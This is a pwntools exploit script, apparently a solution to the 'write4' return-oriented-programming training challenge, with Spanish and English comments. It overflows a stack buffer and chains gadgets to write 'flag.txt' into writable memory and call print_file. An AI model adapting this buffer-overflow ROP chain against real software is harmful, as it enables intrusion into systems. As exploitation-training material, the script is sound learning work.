#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./write4')
context.bits = 64

libc = elf.libc
rop = ROP(elf)

gs = '''
break pwnme
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

#cuando tenemos un libc dcustom, podemos hacer rop

junk = b'A'*32
junk += b'B'*8

movr14r15 = elf.sym.usefulGadgets   #mov r14 r15
printfile = elf.sym.print_file      #a esto debemos pasarle como first argument 'flag.txt'
popr14r15 = rop.r14.address         #sacamos el pop r14 r15
rw_data = 0x00601028                      #find rw with r2 then iS . Con vmmap dentro de gdb podemos ver tambien que zonas podemos escribir
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]            #buscamos un pop rdi

payload = junk
payload += p64(popr14r15)   # r14 inyectara un valor en... 
payload += p64(rw_data)     # tomara un valor y lo escribira en este espacio rw
payload += b'flag.txt'      # se toma este valor y se inyecta en r15
payload += p64(movr14r15)   # mov de r15 a r14
payload += p64(pop_rdi)     # ponemos el valor de la rw_data(flag.txt) al stack
payload += p64(rw_data)     # then we use the space that we wrote to print the flag
payload += p64(rop.ret.address)
payload += p64(printfile)   # llamamos a print_file

r.sendlineafter(b'>', payload)

#============= interactive ================

r.interactive()
